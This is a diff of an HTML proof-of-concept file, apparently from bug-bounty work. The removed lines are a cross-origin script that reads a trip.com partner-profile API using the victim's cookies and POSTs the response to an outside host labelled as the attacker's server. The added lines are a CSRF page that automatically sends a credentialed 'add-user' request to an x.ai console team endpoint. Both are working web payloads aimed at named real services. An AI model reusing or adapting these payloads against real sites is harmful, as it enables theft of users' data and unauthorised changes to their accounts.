@@ -1,17 +1,20 @@
-<script>
-  fetch("https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails", {
-  method: "GET",
-  credentials: "include",
-  headers: {
-    Origin: "http://mytrainpal.com:666"
-  }
-})
-  .then(request => request.text())
-  .then(data => {
-    // Send stolen data to the attacker's server
-    fetch("https://69r3ljqp.c5.rs/leak", {
-      method: "POST",
-      body: data,
-    });
-  });
-</script>
+<!DOCTYPE html>
+  <html>
+  <head>
+      <title>CSRF PoC</title>
+  </head>
+  <body>
+      <h3>XHR CSRF PoC</h3>
+      <script>
+      function sendXHR() {
+          var xhr = new XMLHttpRequest();
+          xhr.open("post", "https://console.x.ai/team/fe5bc330-c191-474d-a460-2c0a1fa20c34/users?action=add-user", true);
+          xhr.withCredentials = true;
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.send("");
+      }
+      sendXHR();
+      </script>
+      <button onclick="sendXHR()">Send Request</button>
+  </body>
+  </html>
